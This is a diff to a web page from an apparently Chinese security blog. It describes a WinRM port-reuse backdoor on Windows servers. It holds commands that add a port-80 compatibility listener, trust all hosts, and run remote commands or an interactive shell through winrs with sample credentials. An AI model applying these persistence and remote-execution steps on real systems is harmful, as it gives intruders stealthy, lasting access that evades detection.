@@ -177,8 +177,12 @@ Visit <span id="busuanzi_value_page_pv"></span>
 <h3 id="端口复用后门"><a href="#端口复用后门" class="headerlink" title="端口复用后门"></a>端口复用后门</h3><p>对于Windows Server 2012以上的服务器操作系统中，WinRM服务默认启动并监听了5985端口。<br>通过下面的命令，可以新增WinRM一个80端口的监听。</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winrm <span class="built_in">set</span> winrm/config/service @&#123;EnableCompatibilityHttpListener=<span class="string">"true"</span>&#125;</span><br></pre></td></tr></table></figure>
 <p>PS：该方法适用于有web的机器，不会开启新端口，也不需要新的EXE进程或DLL劫持。</p>
+<h3 id="查看开启的监听器"><a href="#查看开启的监听器" class="headerlink" title="查看开启的监听器"></a>查看开启的监听器</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winrm e winrm/config/listener</span><br></pre></td></tr></table></figure>
+
+
 <h3 id="Winrs远程执行命令"><a href="#Winrs远程执行命令" class="headerlink" title="Winrs远程执行命令"></a>Winrs远程执行命令</h3><p>需要客户端启用Winrm，SYS权限受限制</p>
-<h4 id="客户端启用Winrm"><a href="#客户端启用Winrm" class="headerlink" title="客户端启用Winrm"></a>客户端启用Winrm</h4><p>winrm quickconfig -q<br>winrm set winrm/config/Client @{TrustedHosts=”*”}</p>
+<h4 id="客户端启用Winrm"><a href="#客户端启用Winrm" class="headerlink" title="客户端启用Winrm"></a>客户端启用Winrm</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">winrm quickconfig -q</span><br><span class="line">winrm <span class="built_in">set</span> winrm/config/Client @&#123;TrustedHosts=<span class="string">"*"</span>&#125;</span><br></pre></td></tr></table></figure>
+
 <h4 id="远程执行CMD"><a href="#远程执行CMD" class="headerlink" title="远程执行CMD"></a>远程执行CMD</h4><p>通过Winrs连接，并执行whoami命令</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winrs -r:http://192.168.1.20 -u:k8gege -p:k8gege520 whoami</span><br></pre></td></tr></table></figure>
 <p>通过Winrs连接，并获得交互式的shell</p>
